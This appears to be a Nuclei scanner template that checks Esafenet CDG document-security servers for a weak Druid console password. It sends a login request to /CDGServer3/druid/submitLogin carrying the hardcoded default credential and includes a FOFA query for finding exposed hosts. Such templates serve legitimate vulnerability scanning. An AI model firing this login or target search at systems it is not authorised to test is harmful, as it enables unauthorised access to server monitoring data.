id: esafenet-cdg-weakpassword-druid
info:
  name: 某赛通电子文档安全管理系统Druid弱口令漏洞
  author: Husky
  severity: medium
  description: 某赛通电子文档安全管理系统Druid弱口令漏洞
  metadata:
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: 亿赛通-电子文档安全管理系统

http:
  - raw:
      - |
        @timeout: 30s
        POST /CDGServer3/druid/submitLogin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Connection: close
        X-Requested-With: XMLHttpRequest

        loginUsername=druid&loginPassword=EstNet.Druid

    max-redirects: 3
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Druid Stat Index"
          - "DruidVersion"
        condition: and

      - type: status
        status:
          - 200
